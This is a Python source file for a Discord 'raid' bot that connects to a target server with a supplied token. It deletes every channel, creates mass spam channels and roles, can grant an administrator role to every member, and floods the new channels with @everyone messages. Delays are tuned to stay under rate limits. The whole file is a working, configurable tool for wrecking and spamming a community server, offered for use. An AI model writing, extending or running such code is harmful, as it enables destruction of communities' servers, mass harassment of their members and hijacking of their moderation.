import discord
from discord.ext import commands
import asyncio
import json
import traceback
import sys

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.members = True  # Required for fetching members and assigning roles

bot = commands.Bot(command_prefix="!", intents=intents)

# Global variables (set in run_bot)
TOKEN = None
GUILD_ID = None
MESSAGE = None
CHANNEL_NAME = None
CHANNEL_COUNT = None
MESSAGES_PER_CHANNEL = None
ROLE_COUNT = None
CREATE_ADMIN_ROLE = None
PING_EVERYONE = None
PING_HERE = None

# Rate limiting: target ~12 actions per second -> 1/12 ≈ 0.0833 seconds between actions
ACTION_DELAY = 0.083

def load_config():
    try:
        with open("config.json", "r") as f:
            config = json.load(f)
        return config
    except FileNotFoundError:
        print("config.json not found. Please run main.py first.")
        sys.exit(1)
    except json.JSONDecodeError:
        print("config.json is corrupted. Delete it and run main.py to recreate.")
        sys.exit(1)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print(f"Guild with ID {GUILD_ID} not found. Check the ID and bot permissions.")
        await bot.close()
        return
    
    print(f"Starting raid on {guild.name}")
    try:
        await raid(guild)
    except Exception as e:
        print(f"Raid encountered an error: {e}")
        traceback.print_exc()
    finally:
        print("Raid completed. Shutting down.")
        await bot.close()

async def raid(guild):
    # 1. Delete all existing channels
    if guild.channels:
        print("Deleting all existing channels...")
        for channel in guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(ACTION_DELAY)
            except Exception as e:
                print(f"Failed to delete {channel.name}: {e}")
    else:
        print("No channels to delete.")
    
    # 2. Create new channels (if count > 0)
    channels = []
    if CHANNEL_COUNT > 0:
        print(f"Creating {CHANNEL_COUNT} channels...")
        for i in range(CHANNEL_COUNT):
            try:
                new_channel = await guild.create_text_channel(f"{CHANNEL_NAME}-{i}")
                channels.append(new_channel)
                print(f"Created channel {new_channel.name}")
                await asyncio.sleep(ACTION_DELAY)
            except Exception as e:
                print(f"Failed to create channel {i}: {e}")
    else:
        print("Skipping channel creation (count = 0).")
    
    # 3. Create roles (ROLE_COUNT)
    if ROLE_COUNT > 0:
        print(f"Creating {ROLE_COUNT} roles...")
        for i in range(ROLE_COUNT):
            try:
                await guild.create_role(name=f"RaidRole-{i}")
                await asyncio.sleep(ACTION_DELAY)
            except Exception as e:
                print(f"Failed to create role {i}: {e}")
    else:
        print("Skipping role creation (count = 0).")
    
    # 4. Optionally create an admin role and assign to everyone
    admin_role = None
    if CREATE_ADMIN_ROLE:
        print("Creating admin role...")
        try:
            # Create a role with administrator permission
            admin_role = await guild.create_role(name="RaidAdmin", permissions=discord.Permissions(administrator=True))
            await asyncio.sleep(ACTION_DELAY)
            
            # Fetch all members (may take time; we'll iterate with rate limiting)
            print("Assigning admin role to all members...")
            async for member in guild.fetch_members(limit=None):
                try:
                    await member.add_roles(admin_role)
                    await asyncio.sleep(ACTION_DELAY)
                except Exception as e:
                    print(f"Failed to assign role to {member.name}: {e}")
        except Exception as e:
            print(f"Failed to create/assign admin role: {e}")
    
    # 5. Spam messages if channels exist and messages per channel > 0
    if channels and MESSAGES_PER_CHANNEL > 0:
        print(f"Sending {MESSAGES_PER_CHANNEL} messages per channel...")
        content = MESSAGE
        if PING_EVERYONE:
            content = "@everyone " + content
        if PING_HERE:
            content = "@here " + content
        
        # Cycle through channels to spread messages
        for msg_index in range(MESSAGES_PER_CHANNEL):
            for channel in channels[:]:  # Use copy in case of removal
                try:
                    await channel.send(content)
                    await asyncio.sleep(ACTION_DELAY)
                except discord.NotFound:
                    channels.remove(channel)
                    print(f"Channel {channel.name} not found, removing from list.")
                except Exception as e:
                    print(f"Failed to send message in {channel.name}: {e}")
        print("Message spamming completed.")
    else:
        print("Skipping message spamming (no channels or messages per channel = 0).")

def run_bot():
    global TOKEN, GUILD_ID, MESSAGE, CHANNEL_NAME, CHANNEL_COUNT, MESSAGES_PER_CHANNEL, ROLE_COUNT, CREATE_ADMIN_ROLE, PING_EVERYONE, PING_HERE
    
    config = load_config()
    TOKEN = config.get("token", "")
    GUILD_ID = int(config.get("guild_id", 0))
    MESSAGE = config.get("message", "@everyone This server is being tested!")
    CHANNEL_NAME = config.get("channel_name", "raid-channel")
    CHANNEL_COUNT = config.get("channel_count", 100)
    MESSAGES_PER_CHANNEL = config.get("messages_per_channel", 10)
    ROLE_COUNT = config.get("role_count", 100)
    CREATE_ADMIN_ROLE = config.get("create_admin_role", False)
    PING_EVERYONE = config.get("ping_everyone", True)
    PING_HERE = config.get("ping_here", False)
    
    if not TOKEN or not GUILD_ID:
        print("Token or Guild ID missing in config.json. Please set them via the GUI.")
        return
    
    bot.run(TOKEN)